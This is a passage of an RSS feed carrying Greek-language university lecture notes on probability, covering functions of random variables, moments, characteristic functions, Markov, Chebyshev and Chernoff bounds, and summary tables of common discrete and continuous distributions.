Αν η \(g\) 1-1 ως προς \(x\) τότε, όταν αναζητούμε πιθανότητες της μορφής:
</p>
\begin{equation}
\label{eq:2}
Pr\{ Y = y_k \} \stackrel{g(x_k) = y_k}{=} Pr\{ X = x_k\}
\end{equation}

<p>
Προφανώς, όμως, αυτό δεν ισχύει υπό όλες τις συνθήκες, και δεν ειναι κάτι που
μπορούμε πάντα να γνωρίζουμε. Ο γενικός κανόνας:
</p>
\begin{equation}
\label{eq:3}
Pr\{ Y = y_k \} \stackrel{y_k = g(x_i),  i\in \cdots}{=} \sum_{i=1} Pr\{ X = x_i \}
\end{equation}
</div>
<ol class="org-ol">
<li><a id="org43b0f83"></a><a href="#org43b0f83">Παρατηρήσεις:</a><br>
<div class="outline-text-5" id="text-1-1-0-1">
<ul class="org-ul">
<li>Για τα παραπάνω είναι χρήσιμη η γραφική παράσταση αν δίνεται. Προσοχή η μορφή
της γραφικής παράστασης της <i>εξαρτώμενης</i> τυχαίας μεταβλητής δεν είναι
απαραίτητο πως θα μοιάζει με εκείνη της <i>ανεξάρτητης</i></li>
</ul>
</div>
</li>
</ol>
<div id="outline-container-orgd53d839" class="outline-4">
<h4 id="orgd53d839"><span class="section-number-4">1.1.1.</span> <a href="#orgd53d839">Βρίσκοντας την τιμή της ΣΠΠ <i>σύνθετης</i> συνάρτησης&#xa0;&#xa0;&#xa0;<span class="tag"><span class="methodology">methodology</span></span></a></h4>
<div class="outline-text-4" id="text-1-1-1">
<p>
Δοθείσης πλεγμένης έκφρασης με τις τμ \(X,Y\). Μπορούμε να βρούμε την \(f_Y(y)\) ως
εξής:
</p>
<ol class="org-ol">
<li>Λύνουμε την \(y = g(x)\)</li>
<li>Έχουμε, έτσι, \(y = g(x_i) \forall i\) τέτοια ώστε \(x_i \in {\mathbb R}\)</li>
<li></li>
</ol>
\begin{equation}
\label{eq:4}
f_Y(y) = \sum_{i=1}
\frac{f_x(x_i)}{|g'(x_i)|}
\end{equation}
</div>
</div>
</div>
</div>
<div id="outline-container-org7057691" class="outline-2">
<h2 id="org7057691"><span class="section-number-2">2.</span> <a href="#org7057691">Παραδείγματα</a></h2>
<div class="outline-text-2" id="text-2">
<p>
Η διάλεξη είχε κυρίως ασκήσεις: Λύθηκαν τα παραδείγματα των διαφανειών 34 και 35
καθώς και η άσκηση με την δίοδο Zener επί της διαφάνειας 36 την οποία αν
<i>διορθώσω</i> θα ανεβάσω εδώ.
</p>
</div>
</div>
]]>
</description></item>
<item>
<title>Διάλεξη 4: Μοντέλο Ροπών</title>
<link>posts/lectures/auth/ssd/lec_SSD_20221017.html</link>
<pubDate>Mon, 17 Oct 2022 00:00:00 +0300</pubDate>
<guid>posts/lectures/auth/ssd/lec_SSD_20221017.html</guid>
<description>
<![CDATA[<div class="note" id="orgcfcc893">
<p>
Το μοντέλο που εξετάστηκε στις προηγούμενες περιπτώσεις για τον προσδιορισμό της
πιθανότητας ορισμένων γεγονότων ονομάζεται <b>πλήρες μοντέλο</b>. Αυτό γιατί μας
επιτρέπει να ξέρουμε τι συμβαίνει για κάθε τιμή της τυχαίας μεταβλητής. Καθώς,
όμως, αυτό δεν είναι πάντα σημαντικό ή και επιτεύξιμο (πειράματα) , είναι δυνατή
και μια ενναλλακτική προσέγγιση.
</p>

</div>
<div id="outline-container-orgd12d75b" class="outline-2">
<h2 id="orgd12d75b"><span class="section-number-2">1.</span> <a href="#orgd12d75b">Μοντέλο Ροπών - Μη πλήρες μοντέλο</a></h2>
<div class="outline-text-2" id="text-1">
<div class="note" id="orgdadcdd3">
<p>
Σελίδα 152
</p>

</div>

<p>
Έξτρα παράμετροι, υπολογίσιμοι από τις συναρτήσεις κατανομής, δίνοντας περαιτέρω
πληροφορίες (κυρίως οπτικές/κατανόησης) επί των πιθανοτήτων.
</p>

<p>
Ο αριθμός τους και το είδος τους καθορίζουν, κατα Πανά, την στατιστική του μοντέλου.
</p>

<p>
Ο γενικός τύπος των ροπών είναι:
</p>
\begin{equation}
\label{eq:17}
m_k = \int_{-\infty}^{\infty}x^kf_x(x)dx
\end{equation}
</div>
<div id="outline-container-org0d158b1" class="outline-3">
<h3 id="org0d158b1"><span class="section-number-3">1.1.</span> <a href="#org0d158b1">Πρώτη ροπή: Μέση τιμή</a></h3>
<div class="outline-text-3" id="text-1-1">
<p>
Γνωστή ήδη από PTS, <b>στατιστική μέση τιμή</b> ή <b>αναμενόμενη τιμή</b>:
</p>

\begin{align}
\label{eq:1}
m_1 = \bar{X} = \mu = E[X] &= \int_{-\infty}^{\infty}xf_X(x)dx\\
&= - \int_{-\infty}^0 F_X(x)dx + \int_{0}^{+\infty}(1-F_X(x))dx &\text{graphical proof}\\
E[X] &= \sum_{i=1}^n x_if_X(x_i)
\end{align}
<p>
Για συνεχείς και διακριτές τμ αντίστοιχα.
</p>


<div id="org37be855" class="figure">
<p><img src="posts/lectures/auth/ssd/course_ssd_images/ssd_lec4_deuteros-typos-mesis-timis.png" alt="ssd_lec4_deuteros-typos-mesis-timis.png">
</p>
</div>
<p>
Χτίζοντας επι αυτού εύκολα προκύπτει:
</p>
\begin{equation}
\label{eq:2}
E[Y] = E[g(X)] = \int_{-\infty}^{\infty}g(x)f_X(x)dx
\end{equation}
</div>
<div id="outline-container-org735e213" class="outline-4">
<h4 id="org735e213"><span class="section-number-4">1.1.1.</span> <a href="#org735e213">Ιδιότητες:</a></h4>
<div class="outline-text-4" id="text-1-1-1">
<ul class="org-ul">
<li>Αποτελεί γραμμικό τελεστή.</li>
</ul>

\begin{align}
\label{eq:18}
E[C] &= C, C\in {\mathbb R}\\
E[CX] &= CE[X], C\in {\mathbb R}\\
E[g_1(X) + g_2(X) + \cdots] &= E[g_1(X)] + E[g_2(X)] + \cdots
\end{align}
</div>
</div>
</div>
<div id="outline-container-orgdea298d" class="outline-3">
<h3 id="orgdea298d"><span class="section-number-3">1.2.</span> <a href="#orgdea298d">Δεύτερη ροπή: Μέση τετραγωνική τιμή τμ.</a></h3>
<div class="outline-text-3" id="text-1-2">
<p>
Αποτελεί την συνολική ισχύ της στοχαστικής διαδικασίας, προκύπτει από τον γενικό
τύπο για \(k=2\)
</p>
\begin{equation}
\label{eq:3}
m_{2}=E[X^2] = \int_{-\infty}^{\infty} x^2f_xdx
\end{equation}
</div>
</div>
</div>
<div id="outline-container-org2f5326c" class="outline-2">
<h2 id="org2f5326c"><span class="section-number-2">2.</span> <a href="#org2f5326c">Κεντρικές ροπές</a></h2>
<div class="outline-text-2" id="text-2">
<p>
Αποτελούν ουσιαστικά επεκτάσεις της γενικότερης έννοιας των ροπών. Αυτό γιατί
αποτελούν τις ροπές της τυχαίας μεταβλητής αν απο εκείνη <i>αφαιρεθεί</i> η αναμενόμενη τιμή<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>
</p>

\begin{align}
\label{eq:4}
\mu_k &= \int_{\infty}^{\infty}(X-E[X])^kf_X(x)dx\\
\mu_k &= \sum_{i}^{k}(x_i-E[X])^kf_X(x_{i})
\end{align}

<ul class="org-ul">
<li>Ονοματολογία βάση \(k\)
<ul class="org-ul">
<li>Μηδενική</li>
<li>Πρώτη</li>
<li>Δεύτερη</li>
<li>&#x2026;</li>
</ul></li>
</ul>
</div>
<div id="outline-container-org5e232a1" class="outline-3">
<h3 id="org5e232a1"><span class="section-number-3">2.1.</span> <a href="#org5e232a1">Βασική ανάλυση</a></h3>
<div class="outline-text-3" id="text-2-1">
\begin{align*}
\mu_0 &= \cdots = m_{0} = 1\\
\mu_1 &= \cdots = 0\\
\mu_2 &= \int_{-\infty}^{\infty} (X-E[X])^2f_X(x)dx = \sigma^2 &\text{variance}\\
&= E[X^2] - E[X]^{2}
\end{align*}
</div>
</div>
<div id="outline-container-org3fe671e" class="outline-3">
<h3 id="org3fe671e"><span class="section-number-3">2.2.</span> <a href="#org3fe671e">Αναλυση επί της δεύτερης κεντρικής ροπής.</a></h3>
<div class="outline-text-3" id="text-2-2">
<ul class="org-ul">
<li>Όπως είδαμε: \(\sqrt{Var[X]}= \sigma\) <b>τυπική απόκλιση</b>.</li>
<li>Σημασία αυτού:
<ul class="org-ul">
<li>Όσο μεγαλώνει απλώνει η γραφική παράσταση της pdf</li>
<li>Όσο μικραίνει τόσο περισσότερο συγκεντρώνονται οι τιμές γύρω από την μέση
της τιμή.</li>
<li class="off"><code>[&#xa0;]</code> ΔΕες διάγραμμα στις διαφάνειες</li>
</ul></li>
</ul>
</div>
</div>
</div>
<div id="outline-container-orgbf006fb" class="outline-2">
<h2 id="orgbf006fb"><span class="section-number-2">3.</span> <a href="#orgbf006fb">Ροπές υπο συνθήκη</a></h2>
<div class="outline-text-2" id="text-3">
<p>
Υπο συνθήκη αναμενόμενη τιμή:
</p>
\begin{equation}
\label{eq:5}
E[X|A] = \int_{-\infty}^{\infty} xf_{X|A} (x)dx
\end{equation}

<p>
Αντίστοιχα με \(g(x)\)<sup><a id="fnr.2" class="footref" href="#fn.2" role="doc-backlink">2</a></sup>
</p>
</div>
</div>
<div id="outline-container-org74893b3" class="outline-2">
<h2 id="org74893b3"><span class="section-number-2">4.</span> <a href="#org74893b3">Χαρακτηριστική συνάρτηση τυχαίας μεταβλητής</a></h2>
<div class="outline-text-2" id="text-4">
<p>
<del>Έχουμε Fourier της PDF:</del>
</p>

<p>
Ως χαρακτηριστική συνάρτηση τυχαίας μεταβλητής \(X\)<sup><a id="fnr.3" class="footref" href="#fn.3" role="doc-backlink">3</a></sup> με PDF \(f_X(x)\) ορίζουμε την:
</p>
\begin{equation}
\label{eq:6}
\Phi_X(\omega) = \int_{-\infty}^{\infty}f_X(x)e^{\jmath \omega x}dx 
\end{equation}

<p>
Αναπτύσσοντας περαιτέρω την προηγούμενη εξίσωση (με σειρές Taylor):
</p>
\begin{align}
\label{eq:7}
\Phi_X(\omega) &= \sum_{k=0}^{\infty} \frac{(\jmath\omega)^k}{k!}\int_{-\infty}^{\infty}f_X(x)x^{k}dx\\
&= \sum_{k=0} \frac{(\jmath\omega)^k}{k!}m_k 
\end{align}

<p>
Όπου, ως γνωστόν, \(m_k\) η κ-οστή ροπή. Μας δείχνει καθ&rsquo;αυτόν τον τρόπο πως με
την χρήση των ροπών μπορούμε να <i>προσεγγίσουμε</i> το γενικότερο μοντέλο.
</p>
</div>
<div id="outline-container-orgc069d52" class="outline-3">
<h3 id="orgc069d52"><span class="section-number-3">4.1.</span> <a href="#orgc069d52">Ιδιότητες</a></h3>
<div class="outline-text-3" id="text-4-1">
\begin{align}
\label{eq:19}
\Phi_X(0) &= 1 &\text{by definition}\\
|\Phi_X(\omega)| &= 1 &\text{easily proven}
\end{align}
</div>
</div>
</div>
<div id="outline-container-orgcd0cf5f" class="outline-2">
<h2 id="orgcd0cf5f"><span class="section-number-2">5.</span> <a href="#orgcd0cf5f">Ανισότητες Markov Chebychev</a></h2>
<div class="outline-text-2" id="text-5">
</div>
<div id="outline-container-orgc99c9d3" class="outline-3">
<h3 id="orgc99c9d3"><span class="section-number-3">5.1.</span> <a href="#orgc99c9d3">Markov</a></h3>
<div class="outline-text-3" id="text-5-1">
<ul class="org-ul">
<li>Αν \(f_X(x)=0 \forall x<0\) τότε</li>
</ul>

\begin{equation}
\label{eq:9}
\forall \alpha >0: Pr\{ X \geq \alpha\} \leq \frac{E[X]}{\alpha}
\end{equation}

<p>
Πως βγαίνει;  
</p>
\begin{equation}
\label{eq:8}
E[X] = \int_0^{\infty} xf_Xdx \geq \int_{\alpha}^{\infty}xf_Xdx \geq \alpha\int_a^{\infty}f_Xdx = \alpha Pr\{ X\geq \alpha\}
\end{equation}

<p>
Τι σημαίνει? Ποια η ερμηνεία του?
</p>
</div>
</div>
<div id="outline-container-org9a7ef48" class="outline-3">
<h3 id="org9a7ef48"><span class="section-number-3">5.2.</span> <a href="#org9a7ef48">Chebychev</a></h3>
<div class="outline-text-3" id="text-5-2">
<p>
<i>Εφαρμόσιμη τόσο για θετικές όσο και για αρνητικές τιμές</i>
</p>
<ul class="org-ul">
<li>Θέτοντας \(\eta = E[X]\), και \(\sigma^2 = E[(X-\eta)^2]\) τότε για \(\forall\epsilon>0\):</li>
</ul>
\begin{equation}
\label{eq:10}
Pr\{ |x-\eta| \geq \epsilon\}\leq 
\frac{\sigma^2}{\epsilon^2}
\end{equation}

<p>
Βγαίνει με όμοια λογική με την Markov.
</p>
</div>
</div>
</div>
<div id="outline-container-org2e7a351" class="outline-2">
<h2 id="org2e7a351"><span class="section-number-2">6.</span> <a href="#org2e7a351">Όρια Chernoff</a></h2>
<div class="outline-text-2" id="text-6">
<p>
<i>Λεει αν και ευρύτατα μαθηματικά έχουν πολλές εφαρμογές</i>
Προκύπτουν από την σχέση:
</p>
\begin{equation}
\label{eq:12}
E[e^{Sx}] = \int\cdots = \Phi(s)
\end{equation}

<ul class="org-ul">
<li class="off"><code>[&#xa0;]</code> Να αντιγραφούν απο τις διαφάνειες.</li>
</ul>
\begin{equation}
\label{eq:11}
\forall \alpha>0, \forall s\in {\mathbb R}: Pr\{ e^{sX} \geq \alpha\} \leq \frac{\Phi(s)}{\alpha}
\end{equation}
</div>
</div>
<div id="footnotes">
<h2 class="footnotes">Footnotes: </h2>
<div id="text-footnotes">

<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
Expected Value - μέση στατιστική τιμή. Και ο λόγος για τον οποίο την
συμβολίζουμε με \(E[X]\) 
</p></div></div>

<div class="footdef"><sup><a id="fn.2" class="footnum" href="#fnr.2" role="doc-backlink">2</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
Στην πραγματικότητα όπου υπάρχει \(X\) εκείνη αποτελεί την πιο απλή (την
γραμμική συνάρτηση) ως όρισμα εκείνου του όρου/συνάρτησης 
</p></div></div>

<div class="footdef"><sup><a id="fn.3" class="footnum" href="#fnr.3" role="doc-backlink">3</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
Αναφερθήκαμε ακόμα στην \(\Phi_X\) και ως <i>moment generating function</i>,
ροπογεννήτρια συνάρτηση.  
</p></div></div>


</div>
</div>]]>
</description></item>
<item>
<title>Διάλεξη 5: Γνωστές Κατανομές</title>
<link>posts/lectures/auth/ssd/lec_SSD_20221019.html</link>
<pubDate>Wed, 19 Oct 2022 00:00:00 +0300</pubDate>
<guid>posts/lectures/auth/ssd/lec_SSD_20221019.html</guid>
<description>
<![CDATA[<div class="note" id="orge29c406">
<p>
Από βιβλίο Καραγιαννίδη και Χατζηδιαμαντή: <b>σελίδες 255,271</b>
</p>

</div>
<div id="outline-container-org1dad3f8" class="outline-2">
<h2 id="org1dad3f8"><span class="section-number-2">1.</span> <a href="#org1dad3f8">Σύνοψη</a></h2>
<div class="outline-text-2" id="text-1">
<p>
Αρχικά είναι σημαντικό κανείς να διακρίνει τις κατανομές βάση της φύσεως των
τυχαίων μεταβλητών τους. Να τις χωρίσει, δηλαδή, σε διακριτές και συνεχείς
κατανομές.
</p>
</div>
<div id="outline-container-org4448b31" class="outline-3">
<h3 id="org4448b31"><span class="section-number-3">1.1.</span> <a href="#org4448b31">Διακριτές</a></h3>
<div class="outline-text-3" id="text-1-1">
<table>
<caption class="t-above"><span class="table-number">Table 1:</span> Μια γενική εικόνα των διακριτών κατανομών</caption>

<colgroup>
<col  class="org-left">

<col  class="org-left">

<col  class="org-left">
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Κατανομή</th>
<th scope="col" class="org-left">Περιγραφή</th>
<th scope="col" class="org-left">ΣΜΠ</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">Bernoulli</td>
<td class="org-left">Πείραμα με 2 αποτελέσματα: 0,1</td>
<td class="org-left">\(f_x(x) = \begin{cases} p &x=1\\ q=1-p &x=0 \end{cases}\)</td>
</tr>

<tr>
<td class="org-left">Διωνυμική</td>
<td class="org-left">Επιτυχίες σε n Bernoulli</td>
<td class="org-left">\(f_x(x) = \binom{n}{x}p^x(1-p)^{n-x}\)</td>
</tr>

<tr>
<td class="org-left">Πολυωνυμική</td>
<td class="org-left">Πείραμα με k αποτελέσματα (Γενίκευση πολυωνυμικής)</td>
<td class="org-left">\(f(x_1,x_2,\cdots) = \binom{n}{x_1,x_2,\cdots}p_1^{x_1},p_2^{x_2},\cdots\)</td>
</tr>

<tr>
<td class="org-left">Γεωμετρική</td>
<td class="org-left">Πλήθος δοκιμών πριν την <span class="underline">πρώτη</span> επιτυχία</td>
<td class="org-left">\(f_{X}(x) = p(1-p)^{x-1}\)</td>
</tr>

<tr>
<td class="org-left">Πασκάλ</td>
<td class="org-left">Πλήθος δοκιμών πριν την <span class="underline">κοστή</span> επιτυχία<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup></td>
<td class="org-left">\(f_{X_k}(x) = \binom{x-1}{k-1}p^k(1-p)^{x-k}\)</td>
</tr>

<tr>
<td class="org-left">Υπεργεωμετρική</td>
<td class="org-left">Πλήθος επιτυχιών σε τυχαία δειγματοληψία</td>
<td class="org-left">\(f_{X_K}(x) = \frac{\binom{N-k}{n-x} \binom{k}{x}}{\binom{N}{n}}\)</td>
</tr>

<tr>
<td class="org-left">Poisson</td>
<td class="org-left">Πλήθος αποτελεσμάτων εντός δεδομένου χρόνου</td>
<td class="org-left">\(f_{X}(x) = \frac{\lambda^x}{x!}e^{-\lambda}\)</td>
</tr>

<tr>
<td class="org-left">Ομοιόμορφη</td>
<td class="org-left">(-_-)</td>
<td class="org-left">\(f_X(x) = \begin{cases} \frac{1}{b-a}, &x\in [a,b]\\ 0 &\text{elsewhere} \end{cases}\)</td>
</tr>
</tbody>
</table>


<table>
<caption class="t-above"><span class="table-number">Table 2:</span> Πίνακας αναφοράς για ΔΚ</caption>

<colgroup>
<col  class="org-left">

<col  class="org-left">

<col  class="org-left">
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Κατανομή</th>
<th scope="col" class="org-left">\(\mu\)</th>
<th scope="col" class="org-left">\(\sigma^2\)</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">Bernoulli</td>
<td class="org-left">\(p\)</td>
<td class="org-left">\(p(1-p)\)</td>
</tr>

<tr>
<td class="org-left">Διωνυμική</td>
<td class="org-left">\(np\)</td>
<td class="org-left">\(np(1-p)\)</td>
</tr>

<tr>
<td class="org-left">Γεωμετρική</td>
<td class="org-left">\(\frac{1}{p}\)</td>
<td class="org-left">\(\frac{q}{p^2}\)</td>
</tr>

<tr>
<td class="org-left">Πασκάλ</td>
<td class="org-left">\(\frac{k}{p}\)</td>
<td class="org-left">\(k*\frac{q}{p^2}\)</td>
</tr>

<tr>
<td class="org-left">Υπεργεωμετρική</td>
<td class="org-left">\(np\)</td>
<td class="org-left">\(np(1-p) \frac{N-n}{N-1}\)</td>
</tr>

<tr>
<td class="org-left">Poisson</td>
<td class="org-left">\(\lambda\)</td>
<td class="org-left">\(\lambda\)</td>
</tr>
</tbody>
</table>
</div>
</div>
<div id="outline-container-org3649bf2" class="outline-3">
<h3 id="org3649bf2"><span class="section-number-3">1.2.</span> <a href="#org3649bf2">Συνεχείς</a></h3>
<div class="outline-text-3" id="text-1-2">
<p>
Εφεξής ΣΚ.
</p>


<table>
<caption class="t-above"><span class="table-number">Table 3:</span> Συνοπτικός πίνακας για τις ΣΚ.</caption>

<colgroup>
<col  class="org-left">

<col  class="org-left">

<col  class="org-left">
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Κατανομή</th>
<th scope="col" class="org-left">Περιγραφή</th>
<th scope="col" class="org-left">ΣΜΠ</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">Gaussian</td>
<td class="org-left">Γιατί γίνεται να υπάρξει μάθημα μηχανικού χωρίς Gauss?</td>
<td class="org-left">\(f_X(x) = \frac{1}{\sqrt{2\pi\sigma^2}}e^{- \frac{(x-\mu)^2}{2\sigma^2}}\)</td>
</tr>

<tr>
<td class="org-left">Λογαριθμοκανονική</td>
<td class="org-left"><i>Αντίγραψε την μα άλλαξε την να μην μας καταλάβουνε</i></td>
<td class="org-left">\(f_X(x) = \frac{1}{\sqrt{2\pi\sigma^2}x}e^{- \frac{(\ln{x}-\mu)^2}{2\sigma^2}}\)</td>
</tr>

<tr>
<td class="org-left">Εκθετική</td>
<td class="org-left">Όπου λογάριθμος και εκθετική. Ενδεικτική του χρόνου μεταξύ δύο γεγονότων</td>
<td class="org-left">\(f_X(x) = \lambda e^{-\lambda x}\)</td>
</tr>

<tr>
<td class="org-left">Erlang</td>
<td class="org-left">Εκθετική μα για τον χρόνο μεταξύ κ γεγονότων</td>
<td class="org-left">\(f_X(x) = \frac{\lambda^{k-1}x^{k-1}}{(k-1)!}\lambda e^{-\lambda x}\)</td>
</tr>

<tr>
<td class="org-left">Laplace</td>
<td class="org-left"><i>Αντίγραψε την μα άλλαξε την να μην μας καταλάβουνε</i></td>
<td class="org-left">\(f_X(x) = \frac{1}{2}\lambda e^{-\lambda\abs{x}}\)</td>
</tr>
</tbody>
</table>




<table>


<colgroup>
<col  class="org-left">

<col  class="org-left">

<col  class="org-left">
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Κατανομή</th>
<th scope="col" class="org-left">\(\mu\)</th>
<th scope="col" class="org-left">\(\sigma^2\)</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">Gaussian</td>
<td class="org-left">\(\mu\)</td>
<td class="org-left">\(\sigma^2\)</td>
</tr>

<tr>
<td class="org-left">Λογαριθμοκανονική</td>
<td class="org-left">\(e^{\mu+ \frac{\sigma^2}{2}}\)</td>
<td class="org-left">\(e^{2\mu+ \sigma^2}(e^{\sigma^2}-1)\)</td>
</tr>

<tr>
<td class="org-left">Εκθετική</td>
<td class="org-left">\(\frac{1}{\lambda}\)</td>
<td class="org-left">\(\frac{1}{\lambda^2}\)</td>
</tr>

<tr>
<td class="org-left">Erlang</td>
<td class="org-left">\(\frac{k}{\lambda}\)</td>
<td class="org-left">\(\frac{k}{\lambda^2}\)</td>
</tr>
</tbody>
</table>
</div>
</div>
</div>
<div id="outline-container-org2b487b9" class="outline-2">
<h2 id="org2b487b9"><span class="section-number-2">2.</span> <a href="#org2b487b9">Διακριτές Κατανομές</a></h2>
<div class="outline-text-2" id="text-2">
</div>
<div id="outline-container-orgfb206fd" class="outline-3">
<h3 id="orgfb206fd"><span class="section-number-3">2.1.</span> <a href="#orgfb206fd">Bernoulli</a></h3>
<div class="outline-text-3" id="text-2-1">
<p>
Η κατανομή Bernoulli είναι πολύ απλή στην κατανόηση: έστω ότι έχουμε ένα πείραμα
με μόνο δύο πιθανά αποτελέσματα (επιτυχία ή αποτυχία), με το αποτέλεσμα του να
δίνεται από την τιμή της τμ \(X\), 1 ή 0 αντίστοιχα. Αυτού του είδους τα πειράματα
λέγονται <b>πειράματα Bernoulli</b>, και η \(X\) λέμε πως ακολουθεί κατανομή Bernoulli:
</p>

<p>
Έχει ΣΜΠ:
</p>
\begin{equation}
\label{eq:13}
f_X(x)=
\begin{cases}
p & \text{success}\\
1-p &\text{failure}
\end{cases} 
\end{equation}

<p>
Το οποίο σε μορφή συναρτήσεων συνεχούς χρόνου μπορεί να γραφτεί ως εξής:
</p>
\begin{equation*}
f_X(x)= p\delta(x-1) + (1-p)\delta(x) 
\end{equation*}
</div>
</div>
<div id="outline-container-org8701f44" class="outline-3">
<h3 id="org8701f44"><span class="section-number-3">2.2.</span> <a href="#org8701f44">Binomial</a></h3>
<div class="outline-text-3" id="text-2-2">
<p>
<i>Χτίζοντας επί της <a href="#orgfb206fd">Bernoulli</a>:</i> Έστω ότι επαναλαμβάνουμε το πείραμα Bernoulli \(n\)
φορές. Η τυχαία μεταβλητή που <b>μετρά το πλήθος των επιτυχιών σε \(n\) ανεξάρτητες
δοκιμές Bernoulli</b> ακολουθεί διωνυμική κατανομή και η ΣΜΠ της δίνεται από την:
</p>

\begin{equation}
\label{eq:14}
f_x(x) = p_x(x) = \binom{n}{x} p^x(1-p)^{n-x}
\end{equation}

<p>
Η διωνυμική κατανομή μπορεί να χρησιμοποιηθεί <span class="underline">όταν η σειρά με την οποία ήρθαν
τα αποτελέσματα έχει σημασία</span>.
</p>

<p>
Μπορεί να γραφεί ως pdf με την χρήση \(\delta\) functions, όπως είδαμε και στην Bernoulli.
</p>

\begin{equation}
\label{eq:15}
F_y(y)=\sum_{k=0}^y \binom{n}{k}p^k(1-p)^{n-k}
\end{equation}
</div>
</div>
<div id="outline-container-org5d240d7" class="outline-3">
<h3 id="org5d240d7"><span class="section-number-3">2.3.</span> <a href="#org5d240d7">Γεωμετρική κατανομή</a></h3>
<div class="outline-text-3" id="text-2-3">
<p>
Έστω και πάλι πως επαναλαμβάνουμε ένα πείραμα Bernoulli \(X\) φορές: τόσες όσες
χρειάζεται για να έχουμε την πρώτη επιτυχία. Η τυχαία μεταβλητή \(X\), που
<b>περιγράφει τον αριθμό των δοκιμών μέχρι την πρώτη επιτυχία</b> ακολουθεί γεωμετρική
κατανομή με:
</p>
\begin{equation}
\label{eq:2}
f_X(x) = p(1-p)^{x-1}
\end{equation}

<p>
<i>Προκύπτει πολύ εύκολα, όπως και οι περισσότερες διακριτές κατανομές με την λογική</i>
</p>
</div>
</div>
<div id="outline-container-orgab9ccc5" class="outline-3">
<h3 id="orgab9ccc5"><span class="section-number-3">2.4.</span> <a href="#orgab9ccc5">Pascal</a></h3>
<div class="outline-text-3" id="text-2-4">
<p>
Όταν μία τμ \(X\) λέμε πως ακολουθεί κατανομή Pascal, ή αλλιώς <b>αρνητική διωνυμική</b>,
τότε η τιμή της είναι ενδεικτική του πλήθους των δοκιμών που χρειάστηκαν μέχρι
την $k$-οστή επιτυχία ( ή του πλήθους των αποτυχιών που χρειάστηκαν, με μία
μικρή μεταβολή στους τύπους )
</p>

<p>
Αν και το όνομα είναι αρκετά παραπλανητικό, έχει άμεση σχέση με την γεωμετρική
κατανομή. Ακόμα ο όρος \(\binom{k-1}{x-1}\) έχει αυτή την μορφή καθώς ξέρουμε ήδη
πως το τελευταίο στοιχείο θα είναι (η $k$οστή) επιτυχία.
</p>
</div>
</div>
<div id="outline-container-orgb7f8cbe" class="outline-3">
<h3 id="orgb7f8cbe"><span class="section-number-3">2.5.</span> <a href="#orgb7f8cbe">Υπεργεωμετρική</a></h3>
<div class="outline-text-3" id="text-2-5">
<p>
Μια πολύ ενδιαφέρουσα κατανομή γιατί αν και συναντάει ευρεία εφαρμογή σε
πειράματα Bernoulli μπορεί να επεκταθεί και σε συνθετότερα πειράματα (με
περισσότερα αποτελέσματα).
</p>
</div>
<ol class="org-ol">
<li><a id="org63e1fc0"></a><a href="#org63e1fc0">Το γενικό concept (εξήγηση για πειράματα Bernoulli)</a><br>
<div class="outline-text-5" id="text-2-5-0-1">
<p>
Έστω οτι έχουμε πραγματοποιήσει \(N\) επαναλήψεις ενός πειράματος Bernoulli, στις
οποίες οι \(k\) ήταν επιτυχίες. <i>Αυτό προφανώς σημαίνει πως οι \((N-k)\) ήταν
αποτυχίες</i>. Αν ορίσουμε τμ Χ τέτοια ώστε να περιγράφει το πλήθος επιτυχιών σε μία
τυχαία δειγματοληψία (επιλογή \(n\) <b>τυχαίων</b> στοιχείων εκ των \(Ν\) ), τότε εκείνη
λέμε οτι ακολουθεί <span class="underline">υπεργεωμετρική</span> κατανομή, και η ΣΜΠ της δίνεται από την:
</p>
\begin{equation}
\label{eq:3}
f_X(x) = \frac{\binom{N-k}{n-x} \binom{k}{x}}{\binom{N}{n}}
\end{equation}
</div>
</li>
<li><a id="orgfda7386"></a><a href="#orgfda7386">Επέκταση για \(z\) διαφορετικά αποτελέσματα</a><br>
<div class="outline-text-5" id="text-2-5-0-2">
<p>
Τώρα αν το πείραμα μας δεν έχει μόνο 2 αλλά \(z\) διαφορετικά αποτελέσματα και
\(N_i\forall i<z\) ο αριθμός των πειραμάτων που <i>έφεραν</i> το $i$οστό αποτέλεσμα
έχουμε<sup><a id="fnr.2" class="footref" href="#fn.2" role="doc-backlink">2</a></sup>:
</p>
\begin{equation}
\label{eq:4}
f(x_1,x_2,x_3,x_4,\cdots) = \frac{\binom{N_1}{x_1} \binom{N_2}{x_2} \binom{N_3}{x_3} \binom{N_4}{x_4} \cdots}{\binom{N}{n}}
\end{equation}
</div>
</li>
</ol>
</div>
</div>
<div id="outline-container-org328a2e0" class="outline-2">
<h2 id="org328a2e0"><span class="section-number-2">3.</span> <a href="#org328a2e0">Συνεχείς</a></h2>
<div class="outline-text-2" id="text-3">
</div>
<div id="outline-container-org279bc8b" class="outline-3">
<h3 id="org279bc8b"><span class="section-number-3">3.1.</span> <a href="#org279bc8b">Gaussian Κανονική</a></h3>
<div class="outline-text-3" id="text-3-1">
<ul class="org-ul">
<li><b>Η μόνη της οποίας το πλήρες μοντέλο προσδιορίζεται από μόνο δύο ροπές.</b> Αν
ξέρεις μέση τιμή και διασπορά ξέρεις τα πάντα.</li>
<li>Η γραφική της παράσταση είναι πολύ εύκολη στην αναγνώριση: <i>καμπάνα</i></li>
<li>Συχνά, μία μεταβλητή ακολουθεί κανονική κατανομή την συμβολίζουμε ως: \(X\sim N(\mu,\sigma^{2})\)</li>
<li><b>Εξαιρετικά κρίσιμη</b> όπως θα φανεί σε επόμενη διάλεξη γιατί προσεγγίζει <i>όλες</i> τις
κατανομές.
<ul class="org-ul">
<li>Με αυτόν τον τρόπο, για παράδειγμα, σχετίζεται με τον θόρυβο στις τηλεπικοινωνίες.</li>
</ul></li>
</ul>
</div>
<div id="outline-container-orgc1d3f95" class="outline-4">
